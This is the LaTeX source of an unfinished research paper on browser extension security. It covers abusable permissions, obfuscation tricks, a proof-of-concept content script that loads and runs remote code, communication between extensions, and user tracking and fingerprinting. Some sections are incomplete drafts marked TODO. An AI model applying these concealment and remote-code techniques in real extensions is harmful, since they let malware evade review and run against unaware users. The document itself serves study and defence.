% !TeX spellcheck = en_US

\section{Permission Analysis}

	% analyzed permissions and corrsponding modules, found modules that we can probably misuse, also found permissions that improve the privacy of the user, some permissions rise warnings on installation to warn the user about the extension's capabilities,
	
\subsection{Privacy Preservation}
	% permissions and constructs that increase the user's security
	% activeTab permission, extension has only access to current web page if user invokes it, invoking means he has to click a element that belongs to the extension such as a button in the toolbar, activeTab is intended to reduce the amount of needed permissions for extensions that only interact with the current web page and only on the users demand, otherwise these extensions need access to every web page to act when the user invokes them, 
	% optional permissions, extension can declare permissions as optional, this states that the permissions are not necesarry for the extension's base functionalities but provide additional features on the user's demand, if the extension requests the optional permission the user is prompted to confirm, if an extension needs access to only a few web pages but the user decides which these are, the extension can use \texttt{https://*/} and \texttt{http://*/} as optional permissions and request for access to web page from a specific domain,
	
\subsection{Dangerous Permissions}
	
	The following paragraphs show a subset of the browser's API modules which pose a potential threat. Each paragraph has the module's name as heading which is equal to the associated permission. If the permission results in a warning on the extensions installation, we added it to the paragraph.

\newenvironment{permissionwarning}{%
	\setlength\topsep{4pt}
	\setlength\parskip{0pt}
	\itshape
	\begin{center}
	}{%
\end{center}
}
	
\paragraph{background}
	If one or more extensions with the background permission are installed and active, the browser starts its execution with the user's login without being invoked and without opening a visible window. The browser will not terminate when the user closes its last window but keeps staying active in the background. This behavior is only implemented in Chrome and can be disabled generally in Chrome's settings.
	
	A malicious extension with this permission can still execute attacks even when no browser window is open.
	
\paragraph{bookmarks} 
	This module gives access to the browser bookmark system. The extension can create new bookmarks, edit existing ones, and remove them. It can also search for particular bookmarks based on parts of the bookmark's title, or URL and retrieve the recently added bookmarks.

	The user's bookmarks give information about his preferences and used web pages. This may be used to identify the currently active user or to determinate potential web page targets for further attacks.
 
	On installation, an extension with this permission shows the user the following warning:
	\begin{permissionwarning}
	 	Read and modify your bookmarks
	\end{permissionwarning}

\paragraph{contentSettings} 
	The browser provides a set of \textit{content settings} that control whether web pages can include and use features such as cookies, JavaScript, or plugins. This module  allows an extension to overwrite these settings on a per-site basis instead of globally.

	A malicious extension can disable settings which the user has explicitly set. This will probably decrease the user's security while browsing the web and support malicious web pages.

	On installation, an extension with this permission shows the user the following warning:
	\begin{permissionwarning}
	 	Manipulate settings that specify whether websites can use features such\\as cookies, JavaScript, plugins, geolocation, microphone, camera etc.
	\end{permissionwarning}

\paragraph{cookies} 
	This module give an extension read and write access to all currently stored cookies, even to \textit{httpOnly} cookies that are normally not accessible by client-side JavaScript.

	An attacker may use an extension to steal session and authentication data which are commonly stored in cookies. This allows him to act with the user's privileges on affected websites. Furthermore, an malicious extension may restore deleted tracking cookies and thereby support user tracking attempts from websites.

\paragraph{downloads} 
	This module allows an extension to initiate and monitor downloads. Some of the module's functions are further restricted by additional permissions. To open a downloaded file, the extension needs the \texttt{downloads.open} permission and to enabled or disable the browser's download shelf, the extension needs the permission \texttt{downloads.shelf}.  
	
	With the additional permission \texttt{downloads.open}, a malicious extension can download a harmful file and execute it. Another malicious approach is to exchange a benign downloaded file with a harmful one without the user noticing. 

\paragraph{geolocation}
	The HTML5 geolocation API provides information about the user's geographical location to JavaScript. With the default browser settings, the user is prompted to confirm if a web page want's to access his location. If an extension uses the geolocation permission, it can use the API without prompting the user to confirm.
 
	On installation, an extension with this permission shows the user the following warning:
	\begin{permissionwarning}
		Detect your physical location 
	\end{permissionwarning}
			
\paragraph{management}
	This module provides information about currently installed extensions. Additionally, it allows to disable and uninstall extensions. To prevent abuse, the user is prompted to confirm if an extension wants to uninstall another extension. 
	
	An attacker may use the feature to disable another extension to silently disable security relevant extension such as 
	\textit{Adblock}\footnote{AdBlock on the Chrome Web Store: \url{https://chrome.google.com/webstore/detail/adblock/gighmmpiobklfepjocnamgkkbiglidom}}, 
	\textit{Avira Browser Safety}\footnote{Avira Browser Safety on the Chrome Web Store: \url{https://chrome.google.com/webstore/detail/avira-browser-safety/flliilndjeohchalpbbcdekjklbdgfkk}}, or 
	\textit{Avast Online Security}\footnote{Avast Online Security on the Chrome Web Store: \url{https://chrome.google.com/webstore/detail/avast-online-security/gomekmidlodglbbmalcneegieacbdmki}}.

	On installation, an extension with this permission shows the user the following warning:
	\begin{permissionwarning}
		Manage your apps, extensions, and themes 
	\end{permissionwarning}
	
\paragraph{proxy}
	Allows an extension to add and remove proxy server to the browser's settings. If a proxy is set, all requests are transmitted over the proxy server.

	This feature may be used by an attacker to send all web requests over a malicious server. For example, a server that logs all requests and therefore steal any use information that is transmitted unsecured.

	On installation, a extension with this permission shows the user the following warning:
	\begin{permissionwarning}
		Read and modify all your data on all websites you visit 
	\end{permissionwarning}
	
\paragraph{system}
	The \texttt{system.cpu}, \texttt{system.memory}, and \texttt{system.storage} permissions provide technical information about the user's machine.
	
	These information may be used to create a profile of the current user's machine and identify him on later occasions.

\paragraph{tabs}
	An extension can access the browser's tab system with the tabs module. This enables the extension to create, update, or close tabs. Furthermore, it provides the functionality to programmatically inject content scripts into web pages and to interact with a content script which is active in a particular tab. To inject a content script, the extension needs a proper host permission that matches the tab's current web page. The tabs permission does not restrict the access to the tabs module but only the access to the URL and title of a tab. 
	
	A malicious extension may prevent the user from uninstalling it by closing the browser's extensions tab as soon as the user opens it. The programmatically injection takes a content script either as a file in the extension's bundle or as a string of code. Therefore, a malicious extension may inject remotely loaded code into a web page as a content script that executes further attacks.
	
	On installation, an extension with this permission shows the user the following warning:
	\begin{permissionwarning}
		Access your browsing activity 
	\end{permissionwarning}		

\paragraph{webRequest}
	This module gives an extension access to in- and outgoing web requests. The extension can redirect, or block requests and modify the request's header.
	
	A malicious extension can use this module to remove security relevant headers such as the \texttt{X-Frame-Options} that states whether or not the web page can be loaded into an iframe, or a CSP. Furthermore, the extension can redirect requests from benign to malicious web pages.

	This permission itself does not result in a warning when an extension that requires it is installed. But, to get access to the data of a web request the extension needs proper host permissions and these result in a warning. The often used host permissions \texttt{http://*/*}, \texttt{https://*/*}, and \texttt{<all\_urls>} result in the following warning:
	\begin{permissionwarning}
		Read and modify your data on all websites you visit 
	\end{permissionwarning}
	
	
	
\section{Attack Analysis} %TODO better name



\subsection{Hide Malicious Behavior} %TODO better name
	
	Developer who publish malicious behavior in extensions want to hide their implementations from detection. There exists many approaches to detect malicious behavior not only in extensions but also in JavaScript applications in general \cite{184485, 190984, Bandhakavi:2011:VBE:1995376.1995398, Dhawan:2009:AIF:1723192.1723250, Hallaraker:2005:DMJ:1078029.1078861, kim2011suspicious}. We can distinct those approaches between \textit{static} and \textit{dynamic} analysis. \\
	
	Static analysis tools scans the extension's source code to find known malicious pattern using content matching. Some other approaches perform a static analysis of the flow of information in the extension. For instance, the static analysis tool VEX tracks information flows from external entry points to JavaScript evaluation methods to find possible Cross-Site-Scripting attack vectors \cite{Bandhakavi:2011:VBE:1995376.1995398}. But it's extensible implementation allows to also track the flow of sensitive information to external destinations and thereby detect the theft of these information. \\ %TODO unzufrieden
	JavaScript's event driven nature impedes static analysis. To make an assumption about what the extension will actually do at runtime is a very difficult task because there exists too many external factors that influent the extension's execution such as user input or asynchronous web requests. We can not predict when exactly a registered event is triggered at runtime if we only consider the static source code. \\
	
	In a dynamic analysis, the extension is executed and evaluated at runtime. This gives the opportunity to exactly log what methods the extension calls and at what point. The focus of dynamic analysis tools for extensions often lies on API calls for the background process and DOM methods for content scripts. An dynamic analysis tool such as Hulk classifies an extension based on the called methods which were classified beforehand. For instance, using the method \\ %TODO
	Again, the event driven nature of JavaScript complicates the analysis. A dynamic analysis tool has to trigger preferably all registered events and hence any potential malicious behavior, too. Therefore, the extension is executed in the scope of different web pages. Because it is not possible to execute the extension in the scope of every existing web page reviewer have to find web pages that with a high degree of probability trigger the extension. For that purpose, they often use for example the \textit{Alexa} most popular websites list. A static analysis beforehand may reveal further web pages that trigger the extension by scanning for parts of URLs in the source code such as URL pattern for content scripts or host permission in a WebExtension's manifest. \\ 
	A concrete web page alone is often not enough to trigger potential malicious behavior. The extension queries the web pages's DOM to find specific elements. To trigger these queries, dynamic analysis tools use so called \textit{honeypages} \cite{184485,190984}. The developer have overridden the DOM query methods to create the queried element on-the-fly. Therefore, the extension will always find targeted elements and execute potential attacks. But this approach has also its disadvantages. A extension may use it to detect the dynamic analysis. It queries a random element which is very unlikely to exists in a real-life scenario. If it finds the element, it has a strong evidence that it is currently the target of a dynamic analysis and may switch to a non-suspicious behavior. \\
	
	A developer that stores his malicious implementation plain in the extensions source code is likely to be detected. Even a reviewer that only performs a manual code analysis is able to detect the malicious implementation. Therefore, the developer will certainly use some technique to hide his implementation. In this section, we present several approaches to prevent malicious behavior from being exposed by an extension analysis.
	
	
	
\subsubsection{Code Obfuscation}
		
	Code obfuscation describes the transformation of a program's source code into a form in which it takes more time to analyze it's capabilities and purpose than in it's original state but without changing the execution result. Strong obfuscation is not or only with great expense reversible. \\
	
	It was originally developed to protect a developer's implementation from code plagiarism. Other developers should not be able to understand the concrete implementation of the program or algorithm. Nowadays, it is often used to hide malicious behavior from detection. Code obfuscation changes the code's structure and therefore prevents the detection of known code pattern. It also changes the application's binary representation which is often used by anti-virus software to identify known threats. A simple method of code obfuscation is to change the order of methods in the source code. This results in a different binary representation for each order but still gives the same result after execution. \\
	
	Code obfuscation is used in programing languages without a strict syntax. JavaScript is suited for obfuscation due to it's very lax syntax. %TODO
	Many open source libraries and tools exist to obfuscate JavaScript \cite{obfuscationDansTools, obfuscationJavascriptObfuscator, obfuscationJscrambler}. Because JavaScript files are not compiled into machine code but directly executed in the browser, obfuscation takes place in the source code and often enlarges it. This fact is used by detection tools. For example, \textit{WebEval} detects obfuscation by comparing the original source code to a prettified version \cite{190984}. If the original code was obfuscated, the difference of the line size between both versions is conspicuous larger. \\
	
	Code obfuscation should not be confused with minification or encryption. Minification targets to decrease the size and hence the download time of JavaScript files. It is often implemented as a script which prints the original script. Although the minimized JavaScript code is not readable by the human eye, its execution returns the original source code. This fact renders minification useless as an obfuscation technique. Similar, encrypted code is unreadable not only to a human but also to the compiler. Consequently, encryption can not be used as an obfuscation technique because obfuscated code has still to be executable. \\
	
	There exists many techniques used for JavaScript obfuscation. The following list shows a subset of common techniques with a brief description and code examples. Detailed explanations are found in several research papers \cite{caffinemonkey, Xu:2013:JMS:2435349.2435364, kim2011suspicious}.
	
	\def\leftside{0.475\textwidth}
	\def\rightside{0.475\textwidth}
	\begin{itemize}
		\begin{minipage}{\leftside}
			\item \textbf{Random Noise} The JavaScript compiler ignores several sections of the source code such as comments, whitespaces, indenting, and linefeeds. Adding those in a random manner does not change the semantics of the source code but changes it's binary representation and hampers content matching.
		\end{minipage} \hspace{1em}
		\begin{minipage}{\rightside}	
			\begin{lstlisting}
var/*foo*/add/*bar      foo*/
= //      3;
/* 1 2 3*/        function       (x
,      y //   return(  x  ); // foo
)      {    return/*bar*/(x+/*
y);   */      y      ;} //  alert('1');
\end{lstlisting}
		\end{minipage} 
		
		\begin{minipage}{\leftside}
			\item \textbf{Reassign Functions} Reassigning function names seizes the assurance that a function with a known and standardized name is actually the expected function implementation. In our example, we reassign the \texttt{eval} function to the standardized \texttt{unescape} function on line 1. A simple static analysis that does not keep track of all variable and function assignments will not recognize the call to the eval function on line 2.
		\end{minipage} \hspace{1em}
		\begin{minipage}{\rightside}	
			\begin{lstlisting}
unescape = eval;
unescape('document.write("secret")');
\end{lstlisting}
		\end{minipage} 
		
		\begin{minipage}{\leftside}
			\item \textbf{Random Symbol Names} Replacing the names of variable, functions, and object elements with non-meaningful names hampers manual analysis and removes further information which facilitate the comprehension of the source code.
		\end{minipage} \hspace{1em}
		\begin{minipage}{\rightside}	
			\begin{lstlisting}
function jf21f(2jd2, k201) {
	return(2jd2 + k201);
}
var 2eh90 = jf21f(2,4);
\end{lstlisting}
		\end{minipage} 	
		
		\begin{minipage}{\leftside}
			\item \textbf{String Splitting} Splitting strings in the source code in several parts hides code words and hampers content matching. The string parts are stored inside arrays and concatenated at run time. To add more confusion, the exact position of each part is often determined by arithmetic calculations. Our example prints the string \textit{"Hello World"}.
		\end{minipage} \hspace{1em}
		\begin{minipage}{\rightside}	
			\begin{lstlisting}
var y = ['d', 'W', 'l', 'He', ' ', 'r', 'o'];
alert(y[3] + y[6-5+1] + y[2] 
	+ y[y.length - 1] + y[2*2]
	+ y[y.length - 6] + y[6] 
	+ y[3+2] + y[1*2] + y[0]);
\end{lstlisting}
		\end{minipage} 	
		
		\begin{minipage}{\leftside}
			\item \textbf{String Encoding} To hide strings even more, they are stored encoded. The hexadecimal representation (e.g.: \texttt{\textbackslash x43}) is often used because the JavaScript compiler decodes them automatically at runtime. Other approaches use the method \texttt{Number.toString(radix)} which returns a string representation of the numeric value in the specified radix. This allows to encode single characters with numeric values. For example, if we use a radix of 36, we can encode all lowercase characters from \texttt{(10).toString(36)} returns \texttt{"a"} to \texttt{(35).toString(36)} returns \texttt{"z"}.
		\end{minipage} \hspace{1em}
		\begin{minipage}{\rightside}	
			\begin{lstlisting}
var y = ['\x64', '\x57', '\x6c', '\x48\x65', 
	'\x20', '\x72', '\x6f'];
alert(y[3] + y[6-5+1] + y[2] 
	+ y[y.length -1] + y[2*2]
	+ y[y.length - 6] + y[6] 
	+ y[3+2] + y[1*2] + y[0]);
\end{lstlisting}
			\begin{lstlisting}
alert((15).toString(18) 
	+ (24).toString(26) 
	+ (24).toString(31));			
\end{lstlisting}
		\end{minipage} 
		
		\begin{minipage}{\leftside}
			\item \textbf{Array Subscript Notation} Commonly, elements of objects in JavaScript are accessed with the dot notation \texttt{object.element} whereas element may also be a function. Using the array subscript notation \texttt{object['element']} allows us to call functions based on string values. This in combination with string encoding or string splitting gives us the opportunity, to hide the name of the called function. Our example calls the constructor of the \texttt{Array.sort()} function \texttt{new Function()} which is equal to \texttt{eval}.
		\end{minipage} \hspace{1em}
		\begin{minipage}{\rightside}
			\begin{lstlisting}
[]['sort']['constructor']('alert(1)')();
\end{lstlisting}
		\end{minipage} 	
		
		\begin{minipage}{\leftside}
			\item \textbf{Dead Code} Adding code sections which will never execute does not change the semantics or the execution time. A static analysis tool will not remove the dead code if it relies on opaque conditions which are never true but based on values from the original source code. The tool will analyze every possible execution path. 
		\end{minipage} \hspace{1em}
		\begin{minipage}{\rightside}	
			\begin{lstlisting}
function add(x, y) {
	if(x > 0 && y != 0 && x / y == 0) {
		for(int i = 0; i < y; i++) {	
			x = i < x ? y + 2 : x - 3;
		}
	}
	return(x + y);
}
\end{lstlisting}
		\end{minipage} 									
	\end{itemize}
	
	Code obfuscation only hampers static analysis. Content matching does not work properly in obfuscated code and approaches for static information flow such as VEX were implemented only for unobfuscated code \cite{Bandhakavi:2011:VBE:1995376.1995398}. Because obfuscation does not change the code's execution, dynamic analysis still detects malicious behavior in obfuscated JavaScript sources. 



\subsubsection{Remotely Loaded Scripts}

	Another possibility to hide a malicious code snippet is to load it from a remote server and execute it at runtime. The code is not present in the extension's installation and can therefore not be detected by a static analysis. \\
	
	An extension has several possibilities to load a remote script. HTML pages which are bundled in the extension's installation can include \texttt{<script>} elements with a \texttt{src} attribute pointing to a remote server. If the extension is executed and the page is loaded, the browser automatically loads and executes the remote script. This mechanism is often used to include public scripts for example from Google Analytics. \\
	A WebExtension needs to explicit state that it wants to fetch remote scripts in its background page. The default Content Security Policy disables the loading of scripts per script element which have another origin than the extension's installation. We can relax the default CSP and enable the loading of remote scripts over HTTPS by adding a URL pattern for the desired origin. \\
	
	Extensions are able to load resources with a XMLHttpRequest. If called from a content script, the XMLHttpRequest will be blocked by the Same Origin Policy if the target does not match the current web page's origin. However, the same restriction does not apply to the extension's background. If the XMLHttpRequest is executed from within the background process, any arbitrary host is allowed as target. \\
	Again, WebExtensions underly a further restriction. Only if a matching host permission is declared in the extension's manifest, the browser will allow the web request. The attacker has to declare a URL pattern which matches his remote server. To disguise the concrete URL of his remote server, the attacker may take use of the pattern \url{http://*/*} and \url{https://*/*}. \\
	The JavaScript extract in \autoref{xhrLoadScript} shows how to fetch a remote script with an XMLHttpRequest. On the first line, we create a new XMLHttpRequest object. This is a standardized API and available to JavaScript in all current browsers \cite{w3cXMLHttpRequest}. The event handler on line 2 till 6 that listens to the \texttt{onreadystatechange} event, handles the response from our request. In our case, the response will be our remote loaded script. We have to check whether the \texttt{readyState} equals 4, which indicates that the operation is done and the response is loaded. The \texttt{open} method on line 7 defines the request type and the target URL and finally on line 8 we execute the request. The \texttt{send} method could take a message that would be sent as a parameter along the request. In our case, this is not necessary because we only want to fetch a resource. 

	\begin{code}
		\begin{lstlisting}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == 4) {
		handleScript(xhr.responseText);
	}
}
xhr.open('GET', 'https://localhost:3001/javascripts/simple.js');
xhr.send();
\end{lstlisting}
		\caption{Load remote script with a XMLHttpRequest}
		\label{xhrLoadScript}
	\end{code}

	Before we can execute a remote loaded script, we have to consider what the scripts objectives are. Whether it should act in the extension's background or as a content script. If the first case applies, we can use the JavaScript method \texttt{eval} to execute the remote loaded text as a JavaScript application. The use of eval is frowned upon because it is a main source of XSS attacks if not used correctly \cite{mozillaDangerousEval}. On that account, the default CSP of a WebExtension disables the use of eval in its background process. We can relax the default policy and add the key \texttt{unsafe\_eval} to lift the restriction. \\
	
	If we want to execute the remote loaded script as a content script, we can programmatically inject it. A WebExtension can use the method \texttt{chrome.tabs.executeScript} to execute a given string as a content script in a currently open tab. To use this feature, the extension needs the \texttt{tabs} permission. This permission is also granted, if the extension uses the \texttt{activeTab} permission but with the drawback that we can only inject the script if the user invokes the extension. A Firefox Add-on can inject the script in an open tab with the method \texttt{require("sdk/tabs").activeTab.attach}. But other than WebExtensions, it can also register a content script with a URL pattern at runtime using the \texttt{sdk/page-mod} module. \\
	
	If we want to execute a remote loaded script only in the scope of a web page, we can take use of the DOM API. It allows us to add a new script element to the current web page. If we set the source attribute of the script element to the URL of our remote server, the browser will fetch and execute the script for us. As a proof of concept, we  implemented a WebExtension that executes the content script shown in \autoref{contentScriptRemotLoad} in any web page without the need for further permissions. The content script creates a new \texttt{script} element, sets the element's \texttt{src} attribute to the URL of our remote server and appends it to the web page's body. The remote loaded script is immediately executed.
	
	\begin{code}
		\begin{lstlisting}	
var script = document.createElement('script');
script.setAttribute('src', 'https://localhost:3001/javascripts/simple.js');
document.body.appendChild(script);
\end{lstlisting}
		\caption{Content Script that executes a remote loaded script}
		\label{contentScriptRemotLoad}
	\end{code}
	
	A dynamic analysis will detect remote loaded scripts. It analyzes the extension at runtime, hence while the remote loaded scripts are present. Some approaches can also be detected by a static analysis. For example script elements that fetch a remote script at execution are easily to detect and contain the full URL. 



\subsubsection{Mutual Extension Communication}

	An extension is able to communicate with another extension. This opens the possibility of a permission escalation as previously described by Bauer et al. \cite{extensions:cns14}. The extension which executes the attack does not need the permissions to fetch the malicious script. Another extension can execute this task and then send the remote script to the executing extension. This allows to give both extensions less permissions and thus making them less suspicious especially for automatic analysis tools. To detect the combined malicious behavior, an analysis tool has to execute both extensions simultaneously. This is a very unconventional approach, because an analysis often targets only a single extension at a time. \\
	
	A communication channel that does not need any special interface can be established over any web page's DOM. All extensions with an active content script in the same web page have access to the same DOM. The extensions which want to communicate with each other can agree upon a specific DOM element and set it's text to exchange messages. Another way to exchange messages is to use the DOM method \texttt{window.postMessage}. This method dispatches a \texttt{message} event on the web pages \texttt{window} object. Any script with access to the web page's \texttt{window} object can register to be notified if the event was dispatched and then read the message. \\
	
	The code shown in \autoref{postMessageListener} and \autoref{postMessageMethod} is an example how to use this method. In \autoref{postMessageListener} we add an event listener to the \texttt{window} object that listens to the \texttt{message} event. The event handler method awaits the key \texttt{from} to be present in the event's data object and the value of \texttt{from} to equal \texttt{extension}. We use this condition to identify messages which were dispatched by an extension. Further, the handler awaits that the message from the other extension is stored with the \texttt{message} key. In \autoref{postMessageMethod} we create our message object with the key-value pairs \texttt{'from':'extension'} and \texttt{'message':'secret'} and call the \textit{postMessage} method with our message object as first parameter. The second parameter defines what the origin of the \texttt{window} object must be in order for the event to be dispatched. In our case, the web page and all content scripts share the same \texttt{window} object. Therefore, a domain check is unnecessary and we us a wildecard to match any domain.
	
	\begin{code}
		\begin{lstlisting}
window.addEventListener('message', function(event) {
	if(event.data.from && event.data.from === 'extension') {
		handle(event.data.message);
	}
});
\end{lstlisting}
		\caption{Event handler for the postMessage method}
		\label{postMessageListener}
	\end{code}
	
	\begin{code}
		\begin{lstlisting}
var message = {
	'from'   : 'extension',
	'message': 'secret'
}
window.postMessage(message, '*');
\end{lstlisting}
		\caption{Call of the postMessage method}
		\label{postMessageMethod}
	\end{code}

\subsection{Tracking}

	%TODO
	If we are able to identify the current user, we can exchange a otherwise benign script with a malicious one or add malicious behavior to an existing script. 
	%%%% fetch different scripts depending on current context
	% no need to hide the servers address if server loads benign scripts most of the time
	% context: web page, user, device
	
	We have previously described the advantage of identifying the current user. If it was successful, we can exchange an otherwise benign script with a malicious one. This allows us to bypass dynamic analysis tools such as Hulk or WebEval and target specific users \cite{184485, 190984}. In this section, we will describe methods to identify the current user and how an extension can execute or even support these methods. 



\subsubsection{User Tracking}

	User tracking refers to the linking of multiple web pages that were visited by the same user, thus allowing to follow the path a user has taken from website to website. User tracking is known to harm the user's privacy and to counter attempts to stay anonymous when browsing in the Internet. %TODO cite 
	But there are also benign reasons for user tracking, for instance improving the usability of a website based on collected information. \\ 
	
	Advertising is the main reason for user tracking. Companies pay large amounts of money to display advertisements for the purpose of increasing their sales volume. Without knowledge about the consumer's interest, a company can not advertise a particular product with success. A consumer is more likely to buy a product - what the goal of advertising is - that fits his needs. Therefore, companies want to collect information's about the consumer and his interests. Given, that more and more consumer use the Internet nowadays, companies focus on websites as advertising medium. The collection and evaluation of a website's user data gives advertising companies the chance to personalize their advertisements. They can display advertisements on websites that with a high degree of probability match the current user's needs. Because this advertising strategy increases their profit, companies pay more money to website's that provide their user data for personalized advertising. Large companies such as Google or Facebook use targeted advertising as their business model. They act as middle man between advertiser and website hosts and provide large advertising networks. Other websites may embed advertisements from those networks which frees them from investing in user tracking and hosting their own servers for advertising. In addition, small websites without a monetization strategy may use embedded advertisements to continue to offer their services for free and still avoid a financial loss. \\
	
	A reason why the displaying of advertisements may be dangerous for a user was researched by Xinyu Xing et al. They analyzed Chrome extensions focused on the distribution of malware through the injection of advertisements \cite{Xing:2015:UMT:2736277.2741630}. They analyzed 18,000 extensions and detected that 56 of 292 extensions which inject advertisements also inject malware into web pages. %TODO 
	\\
	
	Another area for which user tracking is used are web analytics. User data and web traffic is measured, collected, and analyzed to improve web usage. Targeted data is primarily the user's interaction with and movement through the website such as how long a web page is visited, how the user enters and leaves the website, or with which functionality he has trouble. On the basis of these information the website's developer can improve a web page's performance and usability. If used for a vending platform, these information can also be used to coordinate for example sale campaigns. \\
	
	The tracking of a user is often accomplished by storing an identifier on the user's system the first time the user visits a tracking website. Reading out the identifier from another website allows to create a tracking profile for the user. In the following list we will describe several methods used for user tracking. \\

	\begin{itemize}
		\item \textbf{Tracking Cookies} The first web technology used to track users were HTTP cookies. Shortly after the introduction of cookies, first third-party vendors were observed that used cookies to track users between different web pages. %TODO cite
		If a user visits a web page that includes a resource from the tracking third-party, a cookie is fetched together with the requested resource and acts as an identifier for the user. When the user now visits a second web page that again includes some resource from the third-party, the stored cookie is send along with the request for the third-party's resource. The third-party vendor has now successfully tracked the user between two different web pages.  
		
		\item \textbf{Local Shared Objects} Flash player use a technique similar to cookies to synchronize data between different browser sessions. The data is locally stored on the user's system by websites that use flash. Flash cookies as tracking mechanism have the advantage that they track the user behind different browsers and they can store up to 100KB whereas HTTP cookies can only store 4KB. Before 2011, local shared objects could not easily be deleted from within the browser because browser plugins hold the responsibility for their own data. In 2011 a new API was published that simplifies this mechanism \cite{mozillaWikiClearPrivacyAPI}.
		
		\item \textbf{Evercookies} Evercookie is a JavaScript framework implemented to produce persistent identifiers in a browser that are difficult to remove \cite{evercookie}. For that purpose, it uses multiple storage technologies such as HTTP and Flash cookies, HTML5 storages, web history and cache, and unusual techniques such as storing the identifier in RGB values of cached graphics. To hamper the removing from a browser, it recreates deleted identifiers as soon as the user visit a web site that uses the framework. The user has to delete every stored identifier to remove the evercookie completely. 
		
		\item \texttt{Web Beacon} A web beacon is a remote loaded object that is embedded into an HTML document usually a web page or an email. It reveals that the document was loaded. Common used beacons are small and transparent images, usually one pixel in size. If the browser fetches the image it sends a request to the image's server and also sends possible tracking cookies along. This allows websites to track their user on other sites or gives the email's sender the confirmation that his email was read. An example is Facebook's "like" button or similar content from social media websites. Those websites are interested into what other pages their users visit. The "like" button reveals this information without the need to be invoked by the user. 
	\end{itemize}



\subsubsection{Fingerprinting}

	Previously described methods for tracking a user identify him based on some data which was intentionally stored on the user's system. Those stored identifiers are vulnerable to deletion by the user. A study from 2010 showed that a browser reveals many browser- and computer-specific information to web pages \cite{Eckersley:2010:UYW:1881151.1881152}. These information are collected and merged to create an unique fingerprint of the currently used browser. Collecting the same information on another web page and comparing it to stored fingerprints, makes it possible to track and identify the current user without the need to store an identifier on the user's computer. Theoretically, it is possible to identify every person on earth with a fingerprint in the size of approximately 33 bit. Currently eight billion people live on our planet. Using 33 bit of different information we could identify $2^{33}=8,589,934,592$ people. But the same kind of information taken from different users will probably equal. Therefore, it is necessary to collect as much information as possible to create an unique fingerprint. \\
	
	The technique of fingerprinting is an increasingly common practice nowadays which is mostly used by advertising companies and anti-fraud systems. It gives the opportunity to draw a more precise picture of a user. This is supported by the increasing use of mobile devices which provides information about the user's location. Furthermore, analyzing visited web pages and search queries give access to the user's hobbies and personal preferences. Advertising companies focus mainly on the user's personal information to display even more precisely adapted advertisements. Whereas, anti-fraud systems use the identification of the currently used devices to detect possible login tries with stolen credentials. If someone tries to log in to an account, the anti-fraud system compares the fingerprint of the currently used device with stored fingerprints for that account. If the fingerprint does not match, the user either uses a new device or someone unknown got access to the user's credentials. In this case, the web services often use further identification techniques such as personal security questions or similar. \\
	
	
	
	%TODO
	People fear that the gathering and storing of many personal information turns them and their personal life transparent. Big companies such as Google or Facebook sell the user personal information, hence anyone may obtain it. 
	
	
	Fingerprinting is known to harm the user's privacy even more than simple tracking. Fingerprinting companies collect information from many different sources including many personal information, too. Big companies such as Google or Facebook sell these information. People fear that everything they do on the Internet is stored and may be used to harm them. This scenario is similar to a data retention for which politicians started several attempts to legalize it. The main reason for those who support data retention is the fight against crime and terrorism. Although their motives are respectable, people fear that the stored information will not remain in the hands of the government but goes in the hands of companies. The worst case scenario for the user is the same as for fingerprinting. He and his actions on the Internet will turn transparent for anyone who buys the information. \\
	
	For example may a health insurance increase contributions because the insurant often books journeys to countries with a higher risk of an injection or a worker is accused to reveal company secretes because he often communicates with a friend who works for the competition and fired as a result. \\
	
	
	
	% usage of mobile devices increases => devide tracking, location tracking
	% anti-fraud, identify account access with stolen credentials, identify current user and compare to stored information connected to username
	% fingerprinting + tracking => more data, 
	% collected personal data (hobbys, preferences, health status) from visited websites, search queries
	% people fear everything they do on the Internet is stored, data preservation
	% worst case szenarios: health insurance increase contributions because insurant often bookes journeys to dangerous areas or does extreme sports, boss fires user because user often communicates with a friend that works for the competition accuses him to reveal comany secretes
	% positive szenarios: identification of terrorists, tracking of criminals
	
	There exists numerous scientific papers about fingerprinting techniques \cite{paulstone_historysniffing, MBYS11, Nikiforakis:2013:CME:2497621.2498133, Eckersley:2010:UYW:1881151.1881152, MS12, olejnik:hal-00747841}. Because detailed descriptions are off topic for our paper, we focus on a brief description of popular methods. %TODO detailed describtion/brief describtion

	\begin{itemize}
		\item \textbf{Browser Fingerprinting} The browser provides a variety of specific information to a web page that can be used to generate a fingerprint of the user's browser. The following list shows examples of fingerprinting properties and how to access them using JavaScript. 
		
		\begin{tabular}{|l|l|p{0.47\textwidth}|} \hline
			\textbf{Property} & \textbf{JavaScript API} & \textbf{Example Output} \\ \hline
			System & \texttt{navigator.platform} & "Win32" \\ \hline
			Browser Name & \texttt{navigator.userAgent} & "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" \\ \hline
			Browser Engine & \texttt{navigator.appName} & "Netscape" \\ \hline
			Screen Resolution & \texttt{screen.width} & 1366 (pixels) \\
			& \texttt{screen.height} & 768 (pixels) \\
			& \texttt{screen.pixelDepth} & 24 (byte per pixel) \\ \hline
			Timezone & \texttt{Date.getTimezoneOffset()} & -60 (equals UTC+1) \\ \hline
			Browser Language & \texttt{navigator.language} & "de" \\ \hline
			System Languages & \texttt{navigator.languages} & ["de", "en-US", "en"] \\ \hline
		\end{tabular}
		
		\item \textbf{Fonts} The list of fonts available to a web page can serve as part of a user identification. The browser plugin Flash provides an API that returns a list of fonts installed on the current system. As per current scientific works, the order of the fonts list is stable and machine-specific. %TODO cite
		If the Flash plugin is not available in a browser, JavaScript can be used to test whether particular fonts are installed or not. This approach needs a predefined list and may not cover unpopular fonts. It is implemented by writing a string with each font on the web page. If a font is not installed, the browser uses a fall-back font to draw the text. Comparing the width and hight of the drawn font to those of the fall-back font gives an evidence about the font being installed. 
		
		\item \textbf{History Sniffing} Reading out the user's web history can not only serve as fingerprinting method but also to simplify user tracking. The attacker  An outdated approach to test if a user has visited a particular web page was to use the browser's feature to display links to visited web pages in a different color. A web site would hidden from the user add a list of URLs to a web page as link elements and determinate the displayed color. Nowadays, link elements that were queried by JavaScript calls behave like unvisited links fixing the thread from this sniffing attack. A current approach detects the redrawing of link elements to determine if the underlying web page was visited before \cite{paulstone_historysniffing}. If a link is drawn the first time, it is drawn as an unvisited link and simultaneously a query to the browser's web history database is send. When the query returns that the web page behind the link was visited before, it redraws the link element. This event can be captured giving the desired evidence.
		
